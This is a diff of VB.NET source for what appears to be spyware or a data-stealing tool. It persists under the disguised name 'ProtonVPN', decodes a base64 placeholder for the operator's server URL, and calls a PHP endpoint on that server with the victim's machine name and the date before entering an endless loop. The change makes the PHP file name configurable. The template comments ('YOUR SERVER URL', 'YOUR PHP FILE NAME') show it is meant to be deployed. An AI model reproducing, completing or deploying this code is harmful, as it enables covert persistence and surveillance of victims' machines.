@@ -10,9 +10,10 @@ Public Class Form1
                                       "ProtonVPN", Application.ExecutablePath)
         Dim todaysdate As String = String.Format("{0:dd-MM-yyyy}", DateTime.Now)
         Dim server As String = BaseDecode1("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 'YOUR SERVER URL IN BASE64 ENCODED'
+        Dim php As String = "yourphpfilename.php?" & "folder=" 'YOUR PHP FILE NAME'
         Dim webClient As New System.Net.WebClient
-        Dim result2 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName)
-        Dim result3 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName & "/" & todaysdate)
+        Dim result2 As String = webClient.DownloadString(server & php & Environment.MachineName)
+        Dim result3 As String = webClient.DownloadString(server & php & Environment.MachineName & "/" & todaysdate)
         While 1
             Try
                 System.IO.Directory.CreateDirectory("C:\ProgramData\" & Environment.MachineName)
